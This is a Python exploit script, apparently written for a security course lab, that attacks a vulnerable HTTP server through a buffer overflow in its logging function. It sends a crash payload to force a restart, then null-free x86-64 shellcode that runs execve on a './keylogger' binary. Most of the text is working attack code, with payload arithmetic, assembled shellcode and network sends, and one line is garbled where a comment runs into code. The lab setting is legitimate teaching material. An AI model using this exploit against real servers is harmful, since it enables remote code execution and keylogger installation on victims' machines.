
# IMPORTANT NOTES
#  - Start your script with a block comment explaining the course operations of your exploit, decisions you made, the payload structure (if there is one), etc.
#  - Use variables in your attack scripts for environment-dependent values (e.g., 'rsp', the server port) so you can easily change these parameters without having to recalculate anything by hand
#  - There is a chance the 'rbp' value for the 'log_message' function is different on the demo environment
#    Therefore, use a variable with the 'rbp' value to reference the local stack frame!!
#    We can easily give you the 'rbp' of the 'log_message' during the demo
#  - You can use Python or Bash, both have their (dis)adventages
#    With Bash, you can easily use command line tools (e.g., nc, nasm)
#    With Python, it is easier to perform complex operations on intermediate data
#      In python, you can use Keystone to assemble code (https://www.keystone-engine.org/#2-tutorial-for-python-language) (pip install keystone-engine)
#  - Put enough comments throughout the script


'''
[Intro]
This exploit launches ./keylogger using the 'execve' system call in an injected payload.
It injects the payload into a user facing input buffer and exploits a buffer overflow vulnerability in the same buffer to overwrite the return address.
There is no data in between the input buffer and the return address that could disrupt our attack (e.g., if corrupted data could crash the victim program).
The payload contains shell code, data for the shell code, and a new return address.

[Challenges & Decisions]
1. The pointer arguments for 'execve' point to our injected data in the buffer.
   To use this data in the shell code, we need to know their stack addresses, either absolute or relative wrt some known anchor (e.g., a register that already contains a stack address).
   We cannot use the value in 'rbp' as an anchor because the function ended with 'pop rbp; ret' so 'rbp' now contains our injected garbage.
   Alternatives include:
     1. relative addessing wrt the current 'rsp'
     2. absolute addresses
     3. using relative addressing with spare references (in registers or memory) to some stack location with a known offset to the local stack frame
     ...
   Option 1 is the easiest and cleanest method.

2. The injected return address has to be an absolute address pointing to the injected shell code on the stack.
This is hard to forge because the stack base changes with every new socket connection (=> our injected shell code has a different memory location in each connection).
ASLR, however, is disabled for this scenario, so it is technically possible to know the stack base at the Nth connection by simply simulating it in a replicated execution environment.
Even then, it still remains hard to know N during our attack.
We will leverage the auto-restart loop of the victim application, and the given assumption that the server is idle most of the time:
  - first, inject a payload that will crash the server (e.g., by injecting 0xffffffffffffffff as return address)
  - let the server restart
  - perform the attack with N = 1 (we get the location of the injected shell code of the first connection using GDB in our replicated execution environment)

3. The HTTP request header is copied as a string (%s format specifier) into the buffer using 'sprintf'.
Our injected payload, therefore, cannot include null bytes as these would act as a string terminator.
'sprintf' would then only copy the content leading up to the null byte into the buffer.
We construct our payload to not include any null bytes and resort to run-time creation of null bytes if required.

[Injected Payload Structure]
"GET /data.txt HTTP/1.1\r\n"  # 24 bytes, to create a valid request that is not discarded early on by the victim server
"./keylogger"                 # 11 bytes, first 'execve' argument
"12345678"                    # 8 bytes, placeholder for a NULL pointer (= 8 byte) which functions as a null byte to terminate the "./keylogger" string, and as the 'argv' and 'envp' array
<shell_code>
"qq..."                       # padding
<new return address>          # pointing to the first byte of the shell code
"\r\n\r\n"                    # to create a valid request
'''

from keystone import *
from pwn import *

### CONFIGS ###
port = 8080
original_rbp = 0x7ffff7ad1920 # the rbp value before the 'ret' instruction executed
log_buffer_rbp_offset = 0x450 # the log buffer starts at $original_rbp-0x450
log_buffer_prefix = 49 # the server already adds 49 bytes at start of the log buffer


# wait to copy the keylogger binary to the remote machine (allowed in scenario 1)
input("Copy the 'keylogger' binary to 'server_data'. Input anything to continue...")
message_prefix = b"GET /data.txt HTTP/1.1\r\n"
message_prefix_len = len(message_prefix)


### CREATE THE CRASH PAYLOAD ###
crash = message_prefix
padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - len(crash) # extra 8 bytes to account for the caller's rbp
crash += b"q" * padding_size # add padding
crash += 0xffffffffffffffff.to_bytes(8, "little") # add new little endian return address
crash += b"\r\n\r\n"


### CREATE THE ATTACK PAYLOAD ###
keylogger = b"./keylogger"
placeholder = b"12345678"
keylogger_len = len(keylogger)
placeholder_len = len(placeholder)
# the offset of our injected payload wrt the current 'rsp' after 'ret' (required because of challenge 1)
# details: see stack representation at the bottom
payload_rsp_offset = 0x10 + log_buffer_rbp_offset - log_buffer_prefix - message_prefix_len
shell_code=f"""
  # setup execve args
  # note: when launching a program from a shell, the first command argument to the new process is the command invocation that launched the program
  # when manually launching a program with execve, you can either:
  # - follow this "convention", in which case the launched program can access additional command line arguments starting at index 1 (like if it were launched from a shell)
  # - or you can choose to put something else as first argument and make the launched program aware that the arguments start at index 0!
  lea rdi, [rsp-{payload_rsp_offset}] # ptr to injected "./keylogger"
  lea rsi, [rsp-{payload_rsp_offset - keylogger_len}] # argv: ptr to placeholder (future NULL ptr)
  lea rdx, [rsp-{payload_rsp_offset - keylogger_len}] # envp (= argv)
  # put a NULL ptr in the placeholder
  xor rax, rax
  mov [rdx], rax
  # perform the execve syscall
  mov al, 59
  syscall
"""

# assemble the shell code
ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, _ = ks.asm(shell_code)

# build the payload
sc1_exploit = message_prefix
sc1_exploit += keylogger + placeholder # add the argument datasc1_exploit += bytes(encoding0 # add assembled shell code
sc1_exploit += bytes(encoding) # add assembled shell code
padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - len(sc1_exploit) # len includes the 24 bytes
sc1_exploit += b"q" * padding_size # add padding
retaddr = original_rbp - log_buffer_rbp_offset + log_buffer_prefix + message_prefix_len + keylogger_len + placeholder_len # the new (absolute) return address points to the first byte of the shell code
sc1_exploit += retaddr.to_bytes((retaddr.bit_length() + 7) // 8, byteorder = "little") # add new little endian return address without trailing null bytes
sc1_exploit += b"\r\n\r\n"


### PERFORM ATTACK ###
remote("localhost", port).send(crash) # send crash payload
sleep(2) # let the server restart
remote("localhost", port).send(sc1_exploit) # send attack payload


# details for 'payload_rsp_offset':
#
# stack representation after return to the injected shell code:
#
#                            current_rsp <┐            ┌> original_rbp           ┌> start of vulnerable buffer
#                                         |            |                         |
#                                         ||<---0x10-->|<---------0x450--------->|
# stack: <high addresses> =|======<1>======|retaddr|<2>|===========<3>===========| <low addresses>  (stack grow direction -->)
#                          |               |           |<5>|=========<4>=========|
#                          └> current_rbp  |               |==<6>==|==<7>=|==<8>=|
#                                          |                       |<-24->|<-49->|
#                                          |<--payload_rsp_offset->|
#                                                                  └> start of injected payload
# Legend:
#   <1>: caller stack frame
#   <2>: spilled rbp of the caller
#   <3>: log_message stack frame
#   <4>: vulnerable buffer
#   <5>: other local variables
#   <6>: injected payload
#   <7>: "GET /data.txt HTTP/1.1\r\n"
#   <8>: "== Request from..."
